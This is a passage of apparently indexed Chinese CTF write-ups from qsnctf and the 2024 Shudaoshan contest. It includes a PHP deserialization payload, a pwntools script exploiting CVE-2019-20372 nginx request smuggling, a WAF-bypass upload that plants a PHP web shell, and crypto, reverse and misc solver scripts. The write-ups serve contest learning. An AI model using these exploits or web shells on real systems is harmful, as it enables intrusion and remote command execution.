$this-&gt;intention;\n            }\n            echo \"\ud83d\ude4518\u5c81\ud83c\ude32\";\n        }\n    }\n    class Demo\n    {\n        public $a;\n        static function __callStatic($action, $do)\n        {\n            global $b;\n            $b($do[0]);\n        }\n    }\n    $b = $_POST['password'];\n    $a = $_POST['username'];\n    @unserialize($a);\n    if (!isset($b)) {\n        echo \"==================PLZ Input Your Name!==================\";\n    }\n    if($a=='admin'&amp;&amp;$b==\"'k1fuhu's test demo\")\n    {\n        echo(\"\u767b\u5f55\u6210\u529f\");\n    }\n    ?&gt;\n</code></pre> <p>\u53cd\u5e8f\u5217\u5316\uff0c <code>$b($do[0]);</code> \u8fd9\u6bb5\u4ee3\u7801\u53ef\u4ee5\u9020\u6210\u4ee3\u7801\u6267\u884c\u3002</p> <p>\u7f16\u5199\u4ee3\u7801\uff0c\u751f\u6210payload</p>  \u5c55\u5f00\u4ee3\u7801  PHP<pre><code>&lt;?php\nclass shi\n    {\n        public $next;\n        public $pass;\n    }\n    class wo\n    {\n        public $sex;\n        public $age;\n        public $intention;\n    }\n    class Demo\n    {\n        public $a;\n    }\n    $wo = new wo();\n    $shi = new shi();\n    $demo = new Demo();\n    $wo-&gt;sex = 'boy';\n    $wo-&gt;age = 'eighteen';\n    $shi-&gt;next = $demo;\n    $shi-&gt;pass = 'cat /flag';\n    $wo-&gt;intention = $shi;\n    $demo-&gt;a = '111111';\n    echo urlencode(serialize($wo)) ;\n    ?&gt;\n</code></pre> <p>\u6267\u884c\u4ee3\u7801\u751f\u6210payload Bash<pre><code>$ php ser.php \nO%3A2%3A%22wo%22%3A3%3A%7Bs%3A3%3A%22sex%22%3Bs%3A3%3A%22boy%22%3Bs%3A3%3A%22age%22%3Bs%3A8%3A%22eighteen%22%3Bs%3A9%3A%22intention%22%3BO%3A3%3A%22shi%22%3A2%3A%7Bs%3A4%3A%22next%22%3BO%3A4%3A%22Demo%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22111111%22%3B%7Ds%3A4%3A%22pass%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7DHi\n</code></pre></p> <p>\u53d1\u9001payload\u83b7\u5f97flag </p>"},{"location":"CTF/qsnctf/qsnctf%232024round1/#misc","title":"Misc","text":""},{"location":"CTF/qsnctf/qsnctf%232024round1/#pwn","title":"Pwn","text":""},{"location":"CTF/qsnctf/qsnctf%232024round1/#crypto","title":"Crypto","text":""},{"location":"CTF/qsnctf/qsnctf%232024round1/#reverse","title":"Reverse","text":""},{"location":"CTF/%E8%9C%80%E9%81%93%E5%B1%B1/2024%E2%80%9C%E8%9C%80%E9%81%93%E5%B1%B1%E2%80%9D%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/","title":"2024\u201c\u8700\u9053\u5c71\u201d\u9ad8\u6821\u8054\u5408\u516c\u76ca\u8d5b","text":""},{"location":"CTF/%E8%9C%80%E9%81%93%E5%B1%B1/2024%E2%80%9C%E8%9C%80%E9%81%93%E5%B1%B1%E2%80%9D%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/#web","title":"WEB","text":""},{"location":"CTF/%E8%9C%80%E9%81%93%E5%B1%B1/2024%E2%80%9C%E8%9C%80%E9%81%93%E5%B1%B1%E2%80%9D%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/#_1","title":"\u6d77\u5173\u8b66\u5bdf\u8bad\u7ec3\u5e73\u53f0","text":"Text Only<pre><code>Nginx error_page \u8bf7\u6c42\u8d70\u79c1\u6f0f\u6d1e\n</code></pre> <p>\u9898\u76ee\u63d0\u793aflag\u5728 http://infernityhost/flag.html \u731c\u6d4b\u5927\u6982\u662fssrf \u770b\u5230nginx\uff0c\u60f3\u5230CVE-2019-20372 Nginx 1.17.7\u4e4b\u524d\u7248\u672c\u4e2d error_page \u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u8bfb\u53d6\u672a\u6388\u6743\u7684Web\u9875\u9762\u3002 \u7f51\u4e0a\u627e\u4e86\u4e2aexp https://github.com/0xleft/CVE-2019-20372.git \uff1a <code>python import pwn pwn.context.log_level = 'error' remote = pwn.remote('gamebox.yunyansec.com',57855) remote.sendline('GET / HTTP/1.1') remote.sendline('Host: gamebox.yunyansec.com') remote.sendline('') remote.sendline('GET /flag.html HTTP/1.1') remote.sendline('Host: infernityhost') remote.sendline('')  remote.interactive()</code></p>"},{"location":"CTF/%E8%9C%80%E9%81%93%E5%B1%B1/2024%E2%80%9C%E8%9C%80%E9%81%93%E5%B1%B1%E2%80%9D%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/#waf","title":"\u5976\u9f99\u724cWAF","text":"<p>\u9898\u76ee\u9700\u8981\u7ed5\u8fc7\u4e24\u5904waf\uff0c\u6587\u4ef6\u540d\u548c\u6587\u4ef6\u5185\u5bb9 \u6587\u4ef6\u540d\u5904\u7531\u4e8e\u4f7f\u7528pathinfo\uff0c\u53ef\u4f7f\u7528/.\u7ed5\u8fc7 \u6587\u4ef6\u5185\u5bb9\u5904<code>file_get_contents($file['tmp_name'], false, null, 0, 5000);</code> \u4ec5\u8bfb\u53d6\u4e86\u524d5000\u5b57\u8282\u6570\u636e\uff0c\u524d\u9762\u52a05000\u5b57\u7b26\u5c31\u53ef\u7ed5\u8fc7\u3002</p> <p>exp\uff08\u4f7f\u7528\u4e86yakit\u8bed\u6cd5\uff09\uff1a HTTP<pre><code>POST /?name=test.php/. HTTP/1.1\nHost: fa5d30f3.clsadp.com\nUpgrade-Insecure-Requests: 1\nReferer: http://869d1c54.clsadp.com/\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryAvszj4XJf1B9ammA\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCache-Control: max-age=0\nOrigin: http://fa5d30f3.clsadp.com\nContent-Length: 18443\n\n\n------WebKitFormBoundaryAvszj4XJf1B9ammA\nContent-Disposition: form-data; name=\"upload_file\"; filename=\"test.php\"\nContent-Type: image/jpeg\n{{padding:null(1|5001)}}&lt;?php @system($_GET['cmd']);?&gt;\n------WebKitFormBoundaryAvszj4XJf1B9ammA--\n</code></pre></p>"},{"location":"CTF/%E8%9C%80%E9%81%93%E5%B1%B1/2024%E2%80%9C%E8%9C%80%E9%81%93%E5%B1%B1%E2%80%9D%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/#reverse","title":"REVERSE","text":""},{"location":"CTF/%E8%9C%80%E9%81%93%E5%B1%B1/2024%E2%80%9C%E8%9C%80%E9%81%93%E5%B1%B1%E2%80%9D%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/#map_maze","title":"Map_maze","text":"<p>\u9898\u76ee\u4e22\u5165ida\u5206\u6790\uff1a      1.\u521d\u59cb\u5316\u8ff7\u5bab \u51fd\u6570\u00a0<code>sub_4010D0(v4, v5)</code>\u00a0\u521d\u59cb\u5316\u4e86\u4e00\u4e2a\u8ff7\u5bab\u5730\u56fe\uff0c\u5e76\u5c06\u521d\u59cb\u72b6\u6001\u5b58\u50a8\u5728\u00a0<code>v4</code>\u00a0\u548c\u00a0<code>v5</code>\u00a0\u4e2d\u3002     2.\u51fd\u6570\u00a0<code>sub_401E10(aPleaseInputYou, v4[0])</code>\u00a0\u63d0\u793a\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u957f\u5ea6\u4e3a28\u7684\u5b57\u7b26\u4e32\u3002     3.<code>sub_401C40(v4, v5, Str)</code>\u00a0\u6839\u636e\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u00a0<code>Str</code>\u00a0\u5728\u8ff7\u5bab\u4e2d\u79fb\u52a8\uff0c\u5e76\u68c0\u67e5\u6700\u7ec8\u5230\u8fbe\u7684\u4f4d\u7f6e\u662f\u5426\u4e0e\u00a0<code>v5</code>\u00a0\u4e2d\u7684\u76ee\u6807\u4f4d\u7f6e\u5339\u914d\u3002</p> <p>\u6839\u636e<code>sub_4010D0</code>\u00a0\u548c\u00a0<code>sub_401C40</code> \u8fd8\u6709 <code>sub_401080</code>\u00a0\u4e09\u4e2a\u51fd\u6570 \u7f16\u5199\u811a\u672c\uff0c  \u4e09\u4e2a\u51fd\u6570\u4e22\u7ed9ai\uff0c\u83b7\u5f97exp\uff1a Python<pre><code>import hashlib\ndef is_valid_move(maze, x, y, visited):\n    rows = len(maze)\n    cols = len(maze[0])\n    return 0 &lt;= x &lt; rows and 0 &lt;= y &lt; cols and maze[x][y] == 0 and not visited[x][y]\ndef dfs(maze, x, y, end_x, end_y, visited, path, steps):\n    if steps &gt; 28:\n        return False\n    if x == end_x and y == end_y:\n        if steps == 28:\n            print(\"Path found:\", ''.join(path))\n            return True\n        return False\n    visited[x][y] = True\n    directions = [('U', -1, 0), ('D', 1, 0), ('L', 0, -1), ('R', 0, 1)]\n    for direction, dx, dy in directions:\n        new_x, new_y = x + dx, y + dy\n        if is_valid_move(maze, new_x, new_y, visited):\n            path.append(direction)\n            if dfs(maze, new_x, new_y, end_x, end_y, visited, path, steps + 1):\n                return True\n            path.pop()\n\n    visited[x][y] = False\n    return False\ndef find_path(maze, start, end):\n    start_x, start_y = start\n    end_x, end_y = end\n    visited = [[False for _ in range(len(maze[0]))] for _ in range(len(maze))]\n    path = []\n    if not dfs(maze, start_x, start_y, end_x, end_y, visited, path, 0):\n        print(\"no\")\n    else:\n        answer = ''.join(path)\n        print(\"\u7b54\u6848\uff1a\", answer)\n        # \u8ba1\u7b97MD5\u54c8\u5e0c\u503c\n        md5_hash = hashlib.md5(answer.encode()).hexdigest()\n        print(\"flag:\", f\"LZSDS{{{md5_hash}}}\")\ndef extract_maze():\n    maze = [[0 for _ in range(15)] for _ in range(15)]\n    for i in range(15):\n        for j in range(15):\n            maze[i][j] = 0\n    for k in range(1, 15):\n        maze[0][k] = 1\n    for m in range(9, 15):\n        maze[1][m] = 1\n    for n in range(2):\n        maze[2][n] = 1\n    for ii in range(3, 8):\n        maze[2][ii] = 1\n    for jj in range(9, 15):\n        maze[2][jj] = 1\n    for kk in range(2):\n        maze[3][kk] = 1\n    for mm in range(3, 8):\n        maze[3][mm] = 1\n    for nn in range(12, 15):\n        maze[3][nn] = 1\n    for i1 in range(2):\n        maze[4][i1] = 1\n    for i2 in range(7, 10):\n        maze[4][i2] = 0\n    maze[4][7] = 1\n    for i3 in range(11, 15):\n        maze[4][i3] = 1\n    for i4 in range(2):\n        maze[5][i4] = 1\n    for i5 in range(3, 6):\n        maze[5][i5] = 1\n    for i6 in range(11, 15):\n        maze[5][i6] = 1\n    for i7 in range(2):\n        maze[6][i7] = 1\n    maze[6][2] = 0\n    for i8 in range(3, 6):\n        maze[6][i8] = 1\n    for i9 in range(7, 10):\n        maze[6][i9] = 1\n    for i10 in range(11, 15):\n        maze[6][i10] = 1\n    maze[7][0] = 1\n    maze[7][1] = 0\n    maze[7][2] = 0\n    maze[7][3] = 1\n    for i11 in range(4, 6):\n        maze[7][i11] = 1\n    for i12 in range(7, 10):\n        maze[7][i12] = 1\n    for i13 in range(11, 15):\n        maze[7][i13] = 1\n    for i14 in range(2):\n        maze[8][i14] = 1\n    for i15 in range(7, 10):\n        maze[8][i15] = 1\n    for i16 in range(11, 15):\n        maze[8][i16] = 1\n    for i17 in range(6):\n        maze[9][i17] = 1\n    for i18 in range(7, 10):\n        maze[9][i18] = 1\n    for i19 in range(11, 15):\n        maze[9][i19] = 1\n    for i20 in range(6):\n        maze[10][i20] = 1\n    for i21 in range(11, 15):\n        maze[10][i21] = 1\n    for i22 in range(9):\n        maze[11][i22] = 1\n    for i23 in range(13, 15):\n        maze[11][i23] = 1\n    for i24 in range(9):\n        maze[12][i24] = 1\n    maze[12][9] = 0\n    maze[12][10] = 1\n    maze[12][11] = 1\n    maze[12][12] = 0\n    for i25 in range(13, 15):\n        maze[12][i25] = 1\n    for i26 in range(9):\n        maze[13][i26] = 1\n    maze[13][9] = 0\n    maze[13][10] = 1\n    maze[13][11] = 1\n    maze[13][12] = 0\n    for i27 in range(13, 15):\n        maze[13][i27] = 1\n    for i28 in range(12):\n        maze[14][i28] = 1\n    return maze\nmaze = extract_maze()\nprint(maze)\nfind_path(maze, (0, 0), (14, 14))\n</code></pre></p>"},{"location":"CTF/%E8%9C%80%E9%81%93%E5%B1%B1/2024%E2%80%9C%E8%9C%80%E9%81%93%E5%B1%B1%E2%80%9D%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/#crypto","title":"Crypto","text":""},{"location":"CTF/%E8%9C%80%E9%81%93%E5%B1%B1/2024%E2%80%9C%E8%9C%80%E9%81%93%E5%B1%B1%E2%80%9D%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/#xorsa","title":"xorsa","text":"<p>\u5bc6\u7801\u7b7e\u5230\u9898\uff1a</p> <p>exp\uff1a Python<pre><code>from Crypto.Util.number import long_to_bytes\nfrom gmpy2 import gcd, iroot\nc = 13760578729891127041098229431259961120216468948795732373975536417751222443069805775693845560005881981622202089883866395577154701229046245882282127054969114210307175116574178428823043817041956207503299220721042136515863979655578210499512044917781566303947681251248645504273995402630701480590505840473412765662\nn = 14247038211821385209759067256846232227444163173099199085257790370590450749665206556163364754269182255358084948354345827898987234756662133974633117062902370811855466665351784027125333112663075085395676501121759786699720149098576433141817737564928779420725539793335830274229206316999461309927000523188222801659\nhint1 = 8938538619961731399716016665470564084986243880394928918482374295814509353382364651201249532111268951793354572124324033902502588541297713297622432670722730\nhint2 = 1493298155243474837320092849325750387759519643879388609208314494000605554020636706320849032906759121914762492378489852575583260177546578935320977613050647\n# hint2\u5c31\u662fq\nq = hint2\n# \u901a\u8fc7hint1\u548cq\u53ef\u4ee5\u6c42\u51fap: p = hint1 ^ q\np = hint1 ^ q\ne = 2026\n# \u8ba1\u7b97phi\nphi = (p-1) * (q-1)\n# \u68c0\u67e5e\u548cphi\u7684\u6700\u5927\u516c\u7ea6\u6570\ng = gcd(e, phi)\nprint(f\"gcd(e, phi) = {g}\")\n# \u5982\u679ce\u548cphi\u4e0d\u4e92\u8d28\uff0c\u9700\u8981\u5148\u9664\u53bb\u516c\u56e0\u5b50\ne = e // g\nphi = phi // g\n# \u73b0\u5728\u8ba1\u7b97d\nd = pow(e, -1, phi)\n# \u89e3\u5bc6\u65f6\u9700\u8981\u5148\u5f00g\u6b21\u65b9\nm = pow(c, d, n)\nfor _ in range(g):\nm_root = iroot(m, 2)\nif m_root[1]: # \u5982\u679c\u80fd\u5f00\u5e73\u65b9\nm = m_root[0]\nelse:\nprint(\"\u65e0\u6cd5\u7ee7\u7eed\u5f00\u5e73\u65b9\")\nbreak\nflag = long_to_bytes(int(m)).decode()\nprint(flag)\n</code></pre></p>"},{"location":"CTF/%E8%9C%80%E9%81%93%E5%B1%B1/2024%E2%80%9C%E8%9C%80%E9%81%93%E5%B1%B1%E2%80%9D%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/#misc","title":"Misc","text":""},{"location":"CTF/%E8%9C%80%E9%81%93%E5%B1%B1/2024%E2%80%9C%E8%9C%80%E9%81%93%E5%B1%B1%E2%80%9D%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/#golf","title":"golf","text":"<p>\u6ca1\u6709\u7981input(\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u9884\u671f\u89e3)\u3002 input\u8f93\u5165\u7684\u4fe1\u606f\u8fdb\u884c\u5207\u5272\uff0c\u7136\u540e\u590d\u5236\u7ed9s s\u548cBOX\u6bd4\u8f83\uff0c\u6210\u529f\u83b7\u5f97flag Python<pre><code>import base64\nfrom pwn import *\n\ncontext.log_level = 'DEBUG'\nBOX = ['63', '7c', '77', '7b', 'f2', '6b', '6f', 'c5', '30', '01', '67', '2b', 'fe', 'd7', 'ab', '76', 'ca', '82', 'c9', '7d', 'fa', '59', '47', 'f0', 'ad', 'd4', 'a2', 'af', '9c', 'a4', '72', 'c0', 'b7', 'fd', '93', '26', '36', '3f', 'f7', 'cc', '34', 'a5', 'e5', 'f1', '71', 'd8', '31', '15', '04', 'c7', '23', 'c3', '18', '96', '05', '9a', '07', '12', '80', 'e2', 'eb', '27', 'b2', '75', '09', '83', '2c', '1a', '1b', '6e', '5a', 'a0', '52', '3b', 'd6', 'b3', '29', 'e3', '2f', '84', '53', 'd1', '00', 'ed', '20', 'fc', 'b1', '5b', '6a', 'cb', 'be', '39', '4a', '4c', '58', 'cf', 'd0', 'ef', 'aa', 'fb', '43', '4d', '33', '85', '45', 'f9', '02', '7f', '50', '3c', '9f', 'a8', '51', 'a3', '40', '8f', '92', '9d', '38', 'f5', 'bc', 'b6', 'da', '21', '10', 'ff', 'f3', 'd2', 'cd', '0c', '13', 'ec', '5f', '97', '44', '17', 'c4', 'a7', '7e', '3d', '64', '5d', '19', '73', '60', '81', '4f', 'dc', '22', '2a', '90', '88', '46', 'ee', 'b8', '14', 'de', '5e', '0b', 'db', 'e0', '32', '3a', '0a', '49', '06', '24', '5c', 'c2', 'd3', 'ac', '62', '91', '95', 'e4', '79', 'e7', 'c8', '37', '6d', '8d', 'd5', '4e', 'a9', '6c', '56', 'f4', 'ea', '65', '7a', 'ae', '08', 'ba', '78', '25', '2e', '1c', 'a6', 'b4', 'c6', 'e8', 'dd', '74', '1f', '4b', 'bd', '8b', '8a', '70', '3e', 'b5', '66', '48', '03', 'f6', '0e', '61', '35', '57', 'b9', '86', 'c1', '1d', '9e', 'e1', 'f8', '98', '11', '69', 'd9', '8e', '94', '9b', '1e', '87', 'e9', 'ce', '55', '28', 'df', '8c', 'a1', '89', '0d', 'bf', 'e6', '42', '68', '41', '99', '2d', '0f', 'b0', '54', 'bb', '16']\ns = ''.join(BOX)\nprint(s)\npayload = \"b=input('&gt;&gt;&gt;');s=[b[i:i+2] for i in range(0, len(b), 2)]\"\nprint(len(payload))\nb64_payload = base64.b64encode(payload.encode()).decode()\n\nr = remote('gamebox.yunyansec.com', 60431) \nprint('----------')\nr.sendlineafter('give me your solve:\\n',b64_payload)\nprint('----------')\nr.sendlineafter('&gt;&gt;&gt;',s)\nprint('----------')\nprint(r.recvall().decode())    \n</code></pre></p>"},{"location":"CTF/%E8%9C%80%E9%81%93%E5%B1%B1/2024%E2%80%9C%E8%9C%80%E9%81%93%E5%B1%B1%E2%80%9D%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/#elemental-wars","title":"Elemental Wars","text":"<p>\u672c\u4ee5\u4e3a\u6bcf\u5c40\u5bf9\u624b\u51fa\u7684\u90fd\u4e00\u6837\uff0c\u5199\u4e86\u4e2a\u5217\u8868\uff0c\u6ca1\u60f3\u5230\u662f\u968f\u673a\u7684\u3002 \u90a3\u5c31\u66b4\u529b\u89e3\uff0c\u770b\u8138\uff0c\u8dd1\u4e86\u516d\u4e03\u767e\u6b21\u624d\u51faflag.... \u4f9d\u6b21\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\uff0c\u8f93\u4e86\u81ea\u52a8\u4e0b\u4e00\u5c40\uff0c\u76f4\u5230\u8d62\u4e3a\u6b62</p> <p>exp: Python<pre><code>from pwn import *\nr = remote(\"gamebox.yunyansec.com\",48128)\nsl = [4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2, 4, 1, 5, 3, 2]\ni = 0\nwhile True:\n    response = r.recvuntil(\"\uff09\uff1a\",False,1).decode()\n    if \"flag\" in response:\n        print(response)\n        exit()\n    log.info(f\"{i}\\t: {response}\")\n    r.send(f'{sl[i%100]}\\n')\n    i+=1\n</code></pre></p>"},{"location":"CTF/%E8%9C%80%E9%81%93%E5%B1%B1/2024%E2%80%9C%E8%9C%80%E9%81%93%E5%B1%B1%E2%80%9D%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/#_2","title":"\u795e\u5947\u7684\u786c\u5e01\u7eba\u7eb1\u673a","text":"<p>\u5168\u7a0b\u4e0d\u6295\u5e01\uff0c\u5c31\u80fd\u62ff\u5230\u786c\u5e01 exp\uff1a Python<pre><code>from pwn import *\n\nr = remote(\"gamebox.yunyansec.com\",56114)\ncontext.log_level = 'debug'\n\nfor i in range(101):\n    response = r.recvuntil(b'&lt;10?i&gt;:').decode()\n    log.info(f\"{i}\\t: {response}\")\n    r.send('0\\n')\n</code></pre> \u5f00\u542fpwntools\u7684debug\uff0c\u5728debug\u4fe1\u606f\u4e2d\u83b7\u5f97\u6700\u540e\u8fd4\u56de\u7684flag\u3002</p>"},{"location":"CTF/%E8%9C%80%E9%81%93%E5%B1%B1/2024%E2%80%9C%E8%9C%80%E9%81%93%E5%B1%B1%E2%80%9D%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/#javapcap","title":"javaPcap","text":"<p>\u9898\u76ee\u4e3ajava\u7a0b\u5e8f\uff0c\u6839\u636e\u4f20\u5165\u7684cmd\uff0ckey\uff0cencryptMethod\uff0c\u8fdb\u884cshell\u6267\u884c \u9898\u76ee\u7ed9\u51fa\u4e86\u6d41\u91cf\u548cjar\u5305\uff0c \u53cd\u7f16\u8bd1jar\u5305\uff0c\u83b7\u5f974\u4e2ajava\u4ee3\u7801\uff0c \u7f16\u5199\u89e3\u5bc6\u4ee3\u7801</p> <p>Java<pre><code>package server;\n\nimport org.pcap4j.core.*;\nimport org.pcap4j.packet.*;\nimport java.util.concurrent.TimeoutException;\nimport java.io.EOFException;\nimport java.io.File;\nimport java.io.FileWriter;\nimport java.nio.charset.StandardCharsets;\nimport java.util.*;\nimport java.net.URLDecoder;\n\npublic class PcapAnalyzer {\n    private static final Map&lt;String, List&lt;String&gt;&gt; sessions = new HashMap&lt;&gt;();\n    private static final Map&lt;String, Long&gt; sessionTimes = new HashMap&lt;&gt;();\n    private static final Map&lt;String, Map&lt;String, String&gt;&gt; sessionParams = new HashMap&lt;&gt;();\n\n    private static final String RAW_PACKETS_DIR = \"raw_packets\";\n\n    private static final List&lt;Map&lt;String, Object&gt;&gt; urlList = new ArrayList&lt;&gt;();\n\n    public static void main(String[] args) {\n        try {\n            File outputDir = new File(\"aaaa\");\n            if (!outputDir.exists()) {\n                outputDir.mkdir();\n            }\n\n            File pcapFile = new File(\"jpcap.pcap\");\n            if (!pcapFile.exists()) {\n                System.err.println(\"Error: jpcap.pcap file not found!\");\n                return;\n            }\n\n            System.out.println(\"Opening pcap file: \" + pcapFile.getAbsolutePath());\n            PcapHandle handle = Pcaps.openOffline(pcapFile.getAbsolutePath());\n            System.out.println(\"Successfully opened pcap file\");\n\n            int packetCount = 0;\n            int responseCount = 0;\n\n            while (true) {\n                try {\n                    Packet packet = handle.getNextPacketEx();\n                    packetCount++;\n\n                    if (packet.contains(TcpPacket.class) &amp;&amp; packet.contains(IpPacket.class)) {\n                        TcpPacket tcpPacket = packet.get(TcpPacket.class);\n                        IpPacket ipPacket = packet.get(IpPacket.class);\n\n                        String srcIp = ipPacket.getHeader().getSrcAddr().getHostAddress();\n                        String dstIp = ipPacket.getHeader().getDstAddr().getHostAddress();\n                        int srcPort = tcpPacket.getHeader().getSrcPort().valueAsInt();\n                        int dstPort = tcpPacket.getHeader().getDstPort().valueAsInt();\n\n                        String sessionKey = String.format(\"%s:%d-%s:%d\", srcIp, srcPort, dstIp, dstPort);\n                        String reverseKey = String.format(\"%s:%d-%s:%d\", dstIp, dstPort, srcIp, srcPort);\n\n                        if (tcpPacket.getPayload() != null) {\n                            byte[] payload = tcpPacket.getPayload().getRawData();\n                            String data = new String(payload, StandardCharsets.UTF_8);\n\n                            // \u68c0\u67e5\u662f\u5426\u5305\u542bHTTP\u8bf7\u6c42\n                            if (data.contains(\"GET \") || data.contains(\"POST \")) {\n                                String url = extractUrl(data);\n                                if (url != null) {\n                                    Map&lt;String, String&gt; params = parseQueryParams(data);\n                                    if (params != null) {\n                                        // \u6dfb\u52a0URL\u4fe1\u606f\u5230urlList\n                                        Map&lt;String, Object&gt; urlInfo = new HashMap&lt;&gt;();\n                                        urlInfo.put(\"timestamp\", handle.getTimestamp());\n                                        urlInfo.put(\"url\", url);\n                                        urlInfo.put(\"params\", params);\n                                        urlList.add(urlInfo);\n\n                                        if (url.contains(\"/shell\")) {\n                                            sessionParams.put(sessionKey, params);\n                                            sessionTimes.put(sessionKey, handle.getTimestamp().getTime());\n                                        }\n                                    }\n                                }\n                            }\n                            // \u5904\u7406\u54cd\u5e94\n                            else if (sessionParams.containsKey(reverseKey)) {\n                                Map&lt;String, String&gt; requestParams = sessionParams.get(reverseKey);\n                                if (requestParams != null) {\n                                    responseCount++;\n                                    String filename = String.format(\"aaaa/shell_response_%d.txt\", responseCount);\n                                    saveShellResponse(handle, data, requestParams, responseCount, payload, filename);\n                                }\n                            }\n                        }\n                    }\n\n                } catch (TimeoutException e) {\n                    continue;\n                } catch (EOFException e) {\n                    // \u6253\u5370\u6240\u6709URL\u4fe1\u606f\n                    System.out.println(\"\\n=== All URLs ===\");\n                    for (int i = 0; i &lt; urlList.size(); i++) {\n                        Map&lt;String, Object&gt; urlInfo = urlList.get(i);\n                        System.out.println(\"\\nURL #\" + (i + 1));\n                        System.out.println(\"Time: \" + urlInfo.get(\"timestamp\"));\n                        System.out.println(\"URL: \" + urlInfo.get(\"url\"));\n\n                        @SuppressWarnings(\"unchecked\")\n                        Map&lt;String, String&gt; params = (Map&lt;String, String&gt;) urlInfo.get(\"params\");\n                        if (params != null) {\n                            System.out.println(\"Parameters:\");\n                            for (Map.Entry&lt;String, String&gt; entry : params.entrySet()) {\n                                String value = entry.getValue();\n                                if (entry.getKey().equals(\"cmd\")) {\n                                    try {\n                                        value = new String(Base64.getDecoder().decode(value));\n                                        System.out.println(\"  \" + entry.getKey() + \": \" + value + \" (decoded)\");\n                                    } catch (Exception ex) {\n                                        System.out.println(\"  \" + entry.getKey() + \": \" + value);\n                                    }\n                                } else {\n                                    System.out.println(\"  \" + entry.getKey() + \": \" + value);\n                                }\n                            }\n                        }\n                        System.out.println(\"------------------------\");\n                    }\n\n                    System.out.println(\"\\n\u6587\u4ef6\u89e3\u6790\u5b8c\u6210\");\n                    System.out.println(\"\u603b\u5171\u89e3\u6790\u4e86 \" + packetCount + \" \u4e2a\u6570\u636e\u5305\");\n                    System.out.println(\"\u627e\u5230 \" + urlList.size() + \" \u4e2aURL\");\n                    System.out.println(\"\u4fdd\u5b58\u4e86 \" + responseCount + \" \u4e2a\u54cd\u5e94\u6587\u4ef6\u5230 aaaa \u76ee\u5f55\");\n                    break;\n                } catch (Exception e) {\n                    System.err.println(\"Error parsing packet: \" + e.getMessage());\n                    continue;\n                }\n            }\n\n            handle.close();\n\n        } catch (PcapNativeException e) {\n            System.err.println(\"Error opening pcap file: \" + e.getMessage());\n            e.printStackTrace();\n        }\n    }\n\n    private static void saveShellResponse(PcapHandle handle, String data, Map&lt;String, String&gt; requestParams,\n                                        int responseCount, byte[] payload, String filename) throws Exception {\n        String encryptMethod = requestParams.get(\"encryptMethod\");\n        String key = requestParams.get(\"key\");\n        String cmd = new String(Base64.getDecoder().decode(requestParams.get(\"cmd\")));\n\n        try (FileWriter writer = new FileWriter(filename)) {\n            writer.write(\"Time: \" + handle.getTimestamp() + \"\\n\");\n            writer.write(\"Command: \" + cmd + \"\\n\");\n            writer.write(\"Encryption: \" + encryptMethod + \"\\n\");\n            writer.write(\"Key: \" + key + \"\\n\");\n            writer.write(\"\\nEncrypted Content:\\n\");\n            writer.write(data);\n            writer.write(\"\\n\\nHex Content:\\n\");\n            writer.write(bytesToHex(payload));\n\n            // \u5c1d\u8bd5\u89e3\u5bc6\n            try {\n                String decryptedContent = \"\";\n                switch (encryptMethod) {\n                    case \"aes\":\n                        decryptedContent = CustomEncryptor.decryptAES(key, data);\n                        break;\n                    case \"sm4\":\n                        decryptedContent = CustomEncryptor.decryptSM4(key, data);\n                        break;\n                    case \"blowfish\":\n                        decryptedContent = CustomEncryptor.decryptBlowfish(key, data);\n                        break;\n                }\n                writer.write(\"\\n\\nDecrypted Content:\\n\");\n                writer.write(decryptedContent);\n            } catch (Exception e) {\n                writer.write(\"\\n\\nDecryption failed: \" + e.getMessage());\n            }\n        }\n    }\n\n    private static String extractUrl(String data) {\n        try {\n            int start = data.indexOf(\"GET \") != -1 ? data.indexOf(\"GET \") + 4 : data.indexOf(\"POST \") + 5;\n            int end = data.indexOf(\" 